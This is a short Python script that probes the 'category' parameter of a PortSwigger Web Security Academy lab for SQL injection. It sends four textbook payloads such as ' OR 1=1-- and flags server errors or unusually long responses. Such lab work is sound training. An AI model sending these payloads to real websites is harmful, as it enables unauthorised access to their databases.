#!/usr/bin/env python3

import requests

# Replace with your own PortSwigger Web Security Academy lab URL.
LAB_URL = "https://0a9a008f03b28cd182f1150700a5007b.web-security-academy.net"

payloads = [
    "'",
    "'--",
    "' OR 1=1--",
    "' OR '1'='1'--",
]

print("[*] Testing SQL injection on the 'category' parameter...\n")

for payload in payloads:

    response = requests.get(
        f"{LAB_URL}/filter",
        params={"category": payload},
        timeout=10,
    )

    print("=" * 50)
    print(f"Payload : {payload}")
    print(f"Status  : {response.status_code}")
    print(f"Length  : {len(response.text)}")

    if response.status_code == 500:
        print("[+] Possible SQL syntax error detected.")

    elif len(response.text) > 10000:
        print("[+] Interesting response detected.")
